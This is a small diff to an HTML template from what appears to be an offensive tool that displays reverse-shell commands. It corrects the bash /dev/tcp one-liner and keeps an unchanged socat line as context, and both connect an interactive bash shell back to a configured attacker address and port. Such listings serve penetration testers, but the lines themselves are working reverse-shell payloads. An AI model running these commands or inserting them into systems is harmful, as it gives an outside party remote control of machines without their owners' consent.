@@ -129,7 +129,7 @@
         for more.
 
         <h2>bash</h2>
-        <pre>/bin/bash -li >& /dev/tcp/{config.address}:{config.port} 0>&1</pre>
+        <pre>/bin/bash -li >& /dev/tcp/{config.address}/{config.port} 0>&1</pre>
 
         <h2>socat</h2>
         <pre>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{config.address}:{config.port}</pre>
